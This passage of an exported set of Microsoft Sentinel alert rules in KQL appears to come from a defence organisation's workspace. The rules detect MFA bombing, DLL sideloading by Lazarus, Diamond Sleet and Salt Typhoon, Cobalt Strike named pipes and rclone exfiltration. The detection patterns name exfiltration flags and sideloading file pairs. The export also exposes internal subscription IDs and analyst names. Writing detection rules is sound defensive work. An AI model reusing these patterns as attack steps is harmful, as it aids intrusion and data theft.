filters if you have Conditional Access configured\r\n//| where parse_json(AuthenticationDetails)[1].authenticationStepRequirement == \"User, MultiConditionalAccess\"\r\n//| where isnotempty(AlternateSignInName)\r\n//Count all denied and ignored alerts within a 12 hour time-frame\r\n| summarize ['MFA_Actions']=make_list(AuthResult), ['MFATotalFailed']=count() by AppDisplayName, Identity, UserPrincipalName, bin(TimeGenerated, 12h)\r\n//Detect MFA bombing (>3) denied or ignored MFA tokens\r\n| where ['MFATotalFailed'] > 3\r\n| sort by MFATotalFailed\r\n//Order the output in a logical order\r\n| project TimeGenerated, Identity, UserPrincipalName, AppDisplayName, MFA_Actions, MFATotalFailed","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"customDetails":{},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CredentialAccess"],"techniques":["T1110"],"displayName":"DEOS_CTH_Possible IAM MFA bombing from Microsoft 2FA notifications","enabled":true,"description":"\"MFA bombing,\" also known as \"MFA fatigue\" or \"MFA spamming,\" is a cyberattack method where an attacker bombards a user with multiple multi-factor authentication (MFA) prompts in rapid succession. The goal is to frustrate or fatigue the user into eventually approving the request, granting the attacker access to the system. This technique is often used in combination with stolen credentials to bypass security measures, and it exploits human error rather than technical vulnerabilities. \n\nThe appropriate threshold can vary depending on your organization's typical activity levels but commonly ranges from 3 to 5 requests within a short period, such as 5 to 10 minutes. DEOS CTH will monitor and adjust this based on normal behavior and organizational needs. Majority of the activity observed will occur with service accounts not signing in with a CAC. Threshold has been updated to greater than 5 effective 8.13.24 by Brandon Conn of DEOS IR Team.\n\nhttps://cryptsus.com/blog/azure-mfa-bombing-detection-sentinel.html","alertRuleTemplateName":null,"lastModifiedUtc":"2024-08-13T19:18:19.5878035Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/DoD365-LAW-RG2/providers/Microsoft.OperationalInsights/workspaces/DOD365-LAW/providers/Microsoft.SecurityInsights/alertRules/7d08259a-8c79-4054-9a6f-8bff7d0d8d57","name":"7d08259a-8c79-4054-9a6f-8bff7d0d8d57","etag":"\"6501e4dc-0000-2700-0000-66be03c40000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//BAH_Buffer_Overflow_dwm\n//Author: Shawn McWhirter\n//Description: Detects the loading of a dll outside of the System directories by dwm.exe. The dwm.exe process stands for Desktop Window Manager, a critical system process in Windows operating systems. It is responsible for managing and rendering the graphical effects in Windows, including visual effects such as transparent windows, live taskbar thumbnails, and Flip3D. This vulnerability is a Heap-based Buffer Overflow vulnerability that, when exploited, allows a local, privileged attacker to escalate privileges to SYSTEM. Also, detection of suspicious child processes of consent.exe. This can indicate attempts at privilege escalation. It is highly unusual for the consent process to spawn executable child processes and any such activity should be investigated.\n//References: \n//https://app.snapattack.com/detection/44eecf6f-cbb0-4035-aa62-6849a6a9a5c7\n//https://app.snapattack.com/detection/8194b5d4-41ae-4ce7-adfb-92d375e341d2\n//https://app.snapattack.com/threat/385546fd-6bec-88c4-cfee-004ba18d832f?tk=2121&topic=marker\n//False Positives: Acceptable use of Desktop Windows Manager (dwm.exe) or consent.exe. Possibly misconfigured.\nlet file_lookBack = 7d;\nlet signInLookup = (\nSigninLogs\n| where TimeGenerated >= ago(file_lookBack)\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n); \n(union isfuzzy=True\n  (\n  DeviceFileEvents\n  | where (ActionType == \"FileCreated\") and (InitiatingProcessFileName == \"dwm.exe\" and FolderPath endswith \".dll\")\n  | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n  | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n  | project TimeGenerated, DeviceName, UserPrincipalName, InitiatingProcessFileName, FolderPath, MD5, Tactic = \"Possible Desktop Windows Manager Buffer Overflow\"\n  ),(\n  DeviceProcessEvents\n  | where ((ActionType == \"ImageLoaded\") and (InitiatingProcessFileName == \"dwm.exe\" and FolderPath endswith \".dll\") and not ((FolderPath contains @\"Windows\\System32\" or FolderPath contains @\"Windows\\Sysnative\" or FolderPath contains @\"Windows\\SysWOW64\")))\n  | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n  | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n  | project TimeGenerated, DeviceName, UserPrincipalName, InitiatingProcessFileName, FolderPath, MD5, Tactic = \"Possible Desktop Windows Manager Privilege Escalation\"\n  ),(\n  DeviceProcessEvents\n  | where ((InitiatingProcessFileName == \"consent.exe\" and ProcessCommandLine contains \".exe\") and not (ProcessCommandLine contains \"WerFault.exe\" or ProcessCommandLine contains \"PNotif.exe\"))\n  | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n  | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n  | project TimeGenerated, DeviceName, UserPrincipalName, InitiatingProcessFileName, FolderPath, ProcessCommandLine, MD5, Tactic = \"Possible Privilege Escalation via Suspicious Child of Consent.exe\")\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"Process","fieldMappings":[{"identifier":"CommandLine","columnName":"ProcessCommandLine"}]}],"tactics":["PrivilegeEscalation","Execution","LateralMovement"],"techniques":["T1068","T1059","T1021"],"displayName":"BAH_Buffer_Overflow_dwm","enabled":true,"description":"Detects the loading of a dll outside of the System directories by dwm.exe. This vulnerability is a Heap-based Buffer Overflow vulnerability that, when exploited, allows a local, privileged attacker to escalate privileges to SYSTEM. Also, detection of suspicious child processes of consent.exe. This can indicate attempts at privilege escalation. It is highly unusual for the consent process to spawn executable child processes and any such activity should be investigated.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-08-15T13:33:54.7963649Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/539e22b2-3be2-42f5-be5c-13f7a566f74a","name":"539e22b2-3be2-42f5-be5c-13f7a566f74a","etag":"\"28000ec3-0000-2700-0000-66d9f8f10000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT6H","queryPeriod":"PT6H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Informational","query":"let UserWatchList = (_GetWatchlist(\"DEOS_CTH_LegacyAppAuthUsers\") | project UserPrincipalName);\nSigninLogs\n| where TimeGenerated >= ago(6h)\n| where UserPrincipalName in (UserWatchList)\n| where ClientAppUsed == \"Exchange ActiveSync\"\n| where ConditionalAccessStatus == \"failure\"\n| extend StatusError = tostring(parse_json(Status.errorCode))\n| where StatusError != \"0\"\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"customDetails":{"UPN":"UserPrincipalName","IPv4Address":"IPAddress","ClientApp":"ClientAppUsed"},"alertDetailsOverride":{"alertDisplayNameFormat":"DEOS_CTH - Activity from User Account disabled due to conditional access violation","alertDescriptionFormat":"User Account was found attempting authentication utilizing unauthorized legacy application. The account was previously disabled and has been found to be operational.","alertDynamicProperties":[]},"sentinelEntitiesMappings":[{"columnName":"IPAddress"},{"columnName":"UserPrincipalName"},{"columnName":"Identity"},{"columnName":"AuthenticationRequirement"},{"columnName":"ClientAppUsed"}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Persistence","CredentialAccess"],"techniques":["T1098","T1212"],"displayName":"DEOS_CTH - Activity from disabled user account","enabled":true,"description":"Monitors for user accounts associated with gaining/attempting access via legacy methods blocked by conditional access.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-09-05T18:31:11.8670311Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/7d8ccc4b-9a87-4ea0-b3bd-4f6044d612de","name":"7d8ccc4b-9a87-4ea0-b3bd-4f6044d612de","etag":"\"bc19bd39-0000-2700-0000-676974c40000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT3H","queryPeriod":"PT3H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"SigninLogs\r\n| where ResultType == 70044\r\n| take 1\r\n","suppressionDuration":"P1D","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"BAH_Test Analytic","enabled":true,"description":"This is a test alert to validate AutoAssignIncident. Alerts occur every 3 hours (updated 12/19/2024). Live notifications are generated on Teams and Outlook for testing purposes. Please close this incident. Thank you.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-12-23T14:33:39.2063208Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/DoD365-LAW-RG2/providers/Microsoft.OperationalInsights/workspaces/DOD365-LAW/providers/Microsoft.SecurityInsights/alertRules/5b5be907-77ea-417b-965b-4ba5b69b3849","name":"5b5be907-77ea-417b-965b-4ba5b69b3849","etag":"\"93008b7c-0000-2700-0000-66fe9cf00000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"//BAH_APT_DLL_Sideloading\n//Author: Shawn McWhirter\n//Description: Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. This analytic focuses on the specific executable and DLL combinations seen in the wild for both APT groups Lazarus and Diamond Sleet.\n//https://app.snapattack.com/intelligence/c0011e0b-e0b8-4582-995d-273f3e9d8eba\n//https://app.snapattack.com/detection/9696ece9-1750-41bb-a9fe-ac8d5d89e48c\n//https://app.snapattack.com/detection/beea948d-c443-45c9-8f46-2642c2ab3d0f?page=1&sort_by=relevance\n//https://www.welivesecurity.com/en/eset-research/lazarus-luring-employees-trojanized-coding-challenges-case-spanish-aerospace-company/\n//https://www.bleepingcomputer.com/news/security/lazarus-hackers-breach-aerospace-firm-with-new-lightlesscan-malware/\n//https://www.microsoft.com/en-us/security/blog/2023/10/18/multiple-north-korean-threat-actors-exploiting-the-teamcity-cve-2023-42793-vulnerability/\n//False Positives: None known of at this time, highly unlikely.\nlet file_lookBack = 1d;\nlet signInLookup = (\n    SigninLogs\n    | where TimeGenerated >= ago(file_lookBack)\n    | where DeviceDetail contains \"displayName\"\n    | extend DeviceDetailJson = parse_json(DeviceDetail)\n    | extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n    | distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n    );\n(union isfuzzy=True\n    (\n    DeviceFileEvents\n    | where ((ActionType == \"FileCreated\") and ((InitiatingProcessFileName =~ \"PresentationHost.exe\" and FileName =~ \"mscoree.dll\") or (InitiatingProcessFileName =~ \"colorcpl.exe\" and FileName =~ \"colorui.dll\") or (InitiatingProcessFileName =~ \"fixmapi.exe\" and FileName =~ \"mapistub.dll\") or (InitiatingProcessFileName =~ \"tabcal.exe\" and FileName =~ \"HID.dll\")))\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project\n        TimeGenerated,\n        DeviceName,\n        UserPrincipalName,\n        InitiatingProcessFileName,\n        InitiatingProcessFolderPath,\n        FolderPath,\n        FileName,\n        MD5,\n        Tactic = \"Detects sideloading of trojanized DLLs used in Lazarus APT campaign\"\n    ),\n    (\n    DeviceImageLoadEvents\n    | where ((ActionType == \"ImageLoaded\") and ((InitiatingProcessFileName =~ \"PresentationHost.exe\" and FileName =~ \"mscoree.dll\") or (InitiatingProcessFileName =~ \"colorcpl.exe\" and FileName =~ \"colorui.dll\") or (InitiatingProcessFileName =~ \"fixmapi.exe\" and FileName =~ \"mapistub.dll\") or (InitiatingProcessFileName =~ \"tabcal.exe\" and FileName =~ \"HID.dll\")))\n    | where not(FolderPath has_any(\"system32\", \"syswow64\", \"program files\", \"windows defender\\\\platform\", \"winsxs\", \"platform\", \"trend micro\"))\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project\n        TimeGenerated,\n        DeviceName,\n        UserPrincipalName,\n        InitiatingProcessFileName,\n        InitiatingProcessFolderPath,\n        FolderPath,\n        FileName,\n        MD5,\n        Tactic = \"Detects sideloading of trojanized DLLs used in Lazarus APT campaign\"\n    ),\n    (\n    DeviceFileEvents\n    | where ((ActionType == \"FileCreated\") and ((InitiatingProcessFileName =~ \"clip.exe\" and FileName =~ \"Version.dll\") or (FolderPath contains @\":\\ProgramData\\wsmprovhost.exe\" and FolderPath endswith @\":\\ProgramData\\DSROLE.dll\")))\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project\n        TimeGenerated,\n        DeviceName,\n        UserPrincipalName,\n        InitiatingProcessFileName,\n        FolderPath,\n        FileName,\n        MD5,\n        Tactic = \"Possible detection of DLL sideloading activity seen used by Diamond Sleet APT\"\n    ),\n    (\n    DeviceImageLoadEvents\n    | where ((ActionType == \"ImageLoaded\") and ((InitiatingProcessFileName =~ \"clip.exe\" and FileName =~ \"version.dll\") or (InitiatingProcessFileName =~ \"wsmprovhost.exe\" and FileName =~ \"DSROLE.dll\")))\n    | where not(FolderPath has_any(\"system32\", \"syswow64\", \"program files\", \"windows defender\\\\platform\", \"winsxs\", \"platform\", \"trend micro\"))\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project\n        TimeGenerated,\n        DeviceName,\n        UserPrincipalName,\n        InitiatingProcessFileName,\n        FolderPath,\n        FileName,\n        MD5,\n        Tactic = \"Possible detection of DLL sideloading activity seen used by Diamond Sleet APT\"\n    )\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Process","fieldMappings":[{"identifier":"ProcessId","columnName":"InitiatingProcessFileName"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FileName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserPrincipalName"}]}],"tactics":["Persistence","PrivilegeEscalation","DefenseEvasion"],"techniques":["T1574"],"displayName":"BAH_APT_DLL_Sideloading","enabled":true,"description":"Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. This analytic focuses on the specific executable and DLL combinations seen in the wild for both APT groups Lazarus and Diamond Sleet.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-03T13:32:31.9210476Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/48c14f34-1e26-43dc-99b0-b7d11f7404d3","name":"48c14f34-1e26-43dc-99b0-b7d11f7404d3","etag":"\"3b021a09-0000-2700-0000-6723b1300000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT5H","queryPeriod":"PT5H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"union withsource=SourceTable IdentityLogonEvents, CloudAppEvents\r\n| where Application == \"Microsoft Teams\"\r\n| where AccountDisplayName in (\"securityadminhelper\", \"supportserviceadmin\", \"supportadministrator\", \"cybersecurityadmin\", \"*.onmicrosoft.com\") or TargetAccountDisplayName in (\"securityadminhelper\", \"supportserviceadmin\", \"supportadministrator\", \"cybersecurityadmin\", \"*.onmicrosoft.com\")\r\n| where ActionType == \"ChatCreated\"\r\n| where IsExternalUser == true\r\n","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":[],"techniques":[],"displayName":"J361 - BlackBasta Detection","enabled":true,"description":"","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-31T16:32:44.7139972Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/DoD365-LAW-RG2/providers/Microsoft.OperationalInsights/workspaces/DOD365-LAW/providers/Microsoft.SecurityInsights/alertRules/68ba287e-ac45-41cd-a62f-030f23722640","name":"68ba287e-ac45-41cd-a62f-030f23722640","etag":"\"30086594-0000-2700-0000-67360a1a0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"//BAH_APT_Salt_Typhoon\n//Author: Shawn McWhirter\n//Description:This APT has several IOCs/TTPs seen being implemented, including detection of the execution of \"whoami.exe\" by privileged accounts that are often abused by threat actors. Also, detection of known executables and dlls used by Salt Typhoon actors for DLL search order hijacking. These are used to load malicious dlls for malware persistence and execution.\n//https://app.snapattack.com/detection/c9290e22-595b-4524-b1f1-d4b5f46cc84d\n//https://speakerdeck.com/heirhabarov/hunting-for-privilege-escalation-in-windows-environment\n//https://app.snapattack.com/detection/07a41eed-4b0b-4735-826a-f731d945a781\n//https://lolbas-project.github.io/lolbas/Binaries/Msbuild/\n//https://app.snapattack.com/detection/5585b840-7d7b-408a-af6a-775c0f87b212\n//https://www.trendmicro.com/en_gb/research/23/h/earth-estries-targets-government-tech-for-cyberespionage.html\n//https://redcanary.com/threat-detection-report/threats/cobalt-strike/\n//https://app.snapattack.com/detection/408f3f9b-6cf6-4cab-9362-d85518a033f1\n//False Positives: TBD\nlet signInLookup = (\n    SigninLogs\n    | where TimeGenerated >= ago(1d)\n    | where DeviceDetail contains \"displayName\"\n    | extend DeviceDetailJson = parse_json(DeviceDetail)\n    | extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n    | distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n    );\n(union isfuzzy=True\n    (\n    DeviceProcessEvents \n    | where ((ProcessVersionInfoOriginalFileName == \"whoami.exe\" or FolderPath contains @\"\\whoami.exe\") and (toupper(InitiatingProcessAccountName) contains \"AUTHORI\" or toupper(InitiatingProcessAccountName) contains \"AUTORI\" or toupper(InitiatingProcessAccountName) contains \"TrustedInstaller\"))\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project\n        TimeGenerated,\n        DeviceName,\n        UserDisplayName,\n        ProcessCommandLine,\n        ProcessVersionInfoFileDescription,\n        InitiatingProcessAccountName,\n        InitiatingProcessFileName,\n        InitiatingProcessFolderPath,\n        FolderPath,\n        FileName,\n        MD5,\n        Tactic = \"Detects the execution of 'whoami.exe' by privileged accounts that are often abused by threat actors\"\n    ),\n    (\n    DeviceProcessEvents \n    | where (FileName == \"MSBuild.exe\" and (ProcessCommandLine contains \".csproj\" or ProcessCommandLine contains \".xml\" or ProcessCommandLine contains \".rsp\" or ProcessCommandLine contains \"logger\"))\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project\n        TimeGenerated,\n        DeviceName,\n        UserPrincipalName,\n        ActionType,\n        InitiatingProcessFileName,\n        InitiatingProcessFolderPath,\n        InitiatingProcessCommandLine,\n        ProcessCommandLine,\n        FileName,\n        FolderPath,\n        MD5,\n        Tactic = \"Potential MSBuild Living Off The Land Activity\"\n    ),\n    (\n    DeviceFileEvents \n    | where (ActionType == \"FileCreated\" and (FolderPath == \"IJPLMCOM.dll\" or FolderPath == \"brlogapi64.dll\" or FolderPath == \"imfsbDll.dll\" or FolderPath == \"K7AVWScn.dll\" or FolderPath == \"K7UI.dll\" or FolderPath == \"K7SysMn1.dll\" or FolderPath == \"mscoree.dll\" or FolderPath == \"msimg32.dll\" or FolderPath == \"jli.dll\" or FolderPath == \"dxgi.dll\" or FolderPath == \"SbieDll.dll\" or FolderPath == \"ijplmui.exe\" or FolderPath == \"brdifxapi.exe\" or FolderPath == \"imfsbCrypto.exe\" or FolderPath == \"K7AVMScn.exe\" or FolderPath == \"K7TSVlog.exe\" or FolderPath == \"K7SysMon.EXE\" or FolderPath == \"iisexpresstray.exe\" or FolderPath == \"seanalyzertool.exe\" or FolderPath == \"jps.exe\" or FolderPath == \"sfc.exe\" or FolderPath == \"SandboxieBITS.exe\" or FolderPath == \"Indexer.exe\"))\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project\n        TimeGenerated,\n        DeviceName,\n        UserPrincipalName,\n        ActionType,\n        InitiatingProcessFileName,\n        InitiatingProcessFolderPath,\n        InitiatingProcessCommandLine,\n        FileName,\n        FolderPath,\n        MD5,\n        Tactic = \"Potential Salt Typhoon DLL Side-Loading File Indicators\"\n    ),\n    (\n    DeviceEvents \n    | where ((ActionType == \"NamedPipeEvent\") and ((AdditionalFields.PipeName contains @\"\\MSSE-\" and AdditionalFields.PipeName contains \"-server\") or AdditionalFields.PipeName startswith @\"\\postex_\" or AdditionalFields.PipeName startswith @\"\\status_\" or AdditionalFields.PipeName startswith @\"\\msagent_\" or AdditionalFields.PipeName startswith @\"\\mojo_\" or AdditionalFields.PipeName startswith @\"\\interprocess_\" or AdditionalFields.PipeName startswith @\"\\samr_\" or AdditionalFields.PipeName startswith @\"\\netlogon_\" or AdditionalFields.PipeName startswith @\"\\srvsvc_\" or AdditionalFields.PipeName startswith @\"\\lsarpc_\" or AdditionalFields.PipeName startswith @\"\\wkssvc_\"))\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project\n        TimeGenerated,\n        DeviceName,\n        UserPrincipalName,\n        ActionType,\n        AdditionalFields.PipeName,\n        Tactic = \"Potential Salt Typhoon creation of a named pipe as used by CobaltStrike\"\n    )\n    )","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Process","fieldMappings":[{"identifier":"CommandLine","columnName":"ProcessCommandLine"},{"identifier":"ProcessId","columnName":"ProcessVersionInfoFileDescription"},{"identifier":"CreationTimeUtc","columnName":"ActionType"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FileName"},{"identifier":"Directory","columnName":"FolderPath"}]},{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"UserDisplayName"},{"identifier":"DisplayName","columnName":"DeviceName"}]}],"tactics":["PrivilegeEscalation","Execution","DefenseEvasion"],"techniques":["T1055","T1574","T1129","T1127"],"displayName":"BAH_APT_Salt_Typhoon","enabled":true,"description":"This APT has several IOCs/TTPs seen being implemented, including detection of the execution of \"whoami.exe\" by privileged accounts that are often abused by threat actors. Also, detection of known executables and dlls used by Salt Typhoon actors for DLL search order hijacking. These are used to load malicious dlls for malware persistence and execution.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-11-14T14:32:55.2914145Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/DoD365-LAW-RG2/providers/Microsoft.OperationalInsights/workspaces/DOD365-LAW/providers/Microsoft.SecurityInsights/alertRules/d1815af2-ef7e-4c8b-9465-70e42a4e65e7","name":"d1815af2-ef7e-4c8b-9465-70e42a4e65e7","etag":"\"3008849a-0000-2700-0000-67360a220000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"//BAH_APT_RClone Utility Tool usage\n//Author: Shawn McWhirter\n//Description: This activity is significant as rclone.exe is often used by adversaries for data exfiltration, especially during ransomware attacks. If confirmed malicious, this behavior could lead to unauthorized data transfer, resulting in data breaches and potential loss of sensitive information.\n//https://www.helpnetsecurity.com/2024/09/30/ransomware-cloud-compromise/\n//https://app.snapattack.com/detection/0fe6db5b-cfbc-4db4-ade9-64da8aad5263\n//https://redcanary.com/blog/threat-detection/rclone-mega-extortion/\n//https://app.snapattack.com/detection/7af177d9-28fc-46c7-9f77-b69e6b04a056\n//https://www.nccgroup.com/us/research-blog/detecting-rclone-an-effective-tool-for-exfiltration/\n//https://app.snapattack.com/detection/38f8b9ed-9517-46da-bcf8-4ccc71437c01\n//https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/\n//https://attack.mitre.org/techniques/T1021/006/\n//https://attack.mitre.org/techniques/T1567/002/\n//False Positives: Legitimate use of rclone to manage files on cloud storage.\nlet signInLookup = (\n    SigninLogs\n    | where TimeGenerated >= ago(1d)\n    | where DeviceDetail contains \"displayName\"\n    | extend DeviceDetailJson = parse_json(DeviceDetail)\n    | extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n    | distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n    );\n(union isfuzzy=True\n    (\n    DeviceProcessEvents\n    | where (((ProcessCommandLine contains \"--config \" and ProcessCommandLine contains \"--no-check-certificate \" and ProcessCommandLine contains \" copy \") or ((FolderPath contains @\"\\rclone.exe\" or ProcessVersionInfoFileDescription == \"Rsync for cloud storage\") and (ProcessCommandLine contains \"pass\" or ProcessCommandLine contains \"user\" or ProcessCommandLine contains \"copy\" or ProcessCommandLine contains \"sync\" or ProcessCommandLine contains \"config\" or ProcessCommandLine contains \"lsd\" or ProcessCommandLine contains \"remote\" or ProcessCommandLine contains \"ls\" or ProcessCommandLine contains \"mega\" or ProcessCommandLine contains \"pcloud\" or ProcessCommandLine contains \"ftp\" or ProcessCommandLine contains \"ignore-existing\" or ProcessCommandLine contains \"auto-confirm\" or ProcessCommandLine contains \"transfers\" or ProcessCommandLine contains \"multi-thread-streams\" or ProcessCommandLine contains \"no-check-certificate \"))))\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project\n        TimeGenerated,\n        DeviceName,\n        UserPrincipalName,\n        ProcessCommandLine,\n        ProcessVersionInfoFileDescription,\n        InitiatingProcessFileName,\n        InitiatingProcessFolderPath,\n        FolderPath,\n        FileName,\n        MD5,\n        Tactic = \"Detects RClone utility usage for possible exfiltration used by ransomware strains\"\n    ),\n    (\n    DeviceFileEvents\n    | where (ActionType == \"FileCreated\" and FolderPath contains @\":\\Users\\\" and FolderPath contains @\"\\.config\\rclone\\\")\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project\n        TimeGenerated,\n        DeviceName,\n        UserPrincipalName,\n        ActionType,\n        InitiatingProcessFileName,\n        InitiatingProcessFolderPath,\n        FolderPath,\n        FileName,\n        MD5,\n        Tactic = \"Detects Rclone config files being created\"\n    ),(\n    DeviceNetworkEvents\n    | where InitiatingProcessCommandLine has_all(\"copy\", \"--max-age\", \"--ignore-existing\", \"--multi-thread-streams\", \"--transfers\") and InitiatingProcessCommandLine has_any(\"ftp\", \"ssh\", \"-q\")\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project\n        TimeGenerated,\n        DeviceName,\n        InitiatingProcessAccountName,\n        ActionType,\n        InitiatingProcessCommandLine,\n        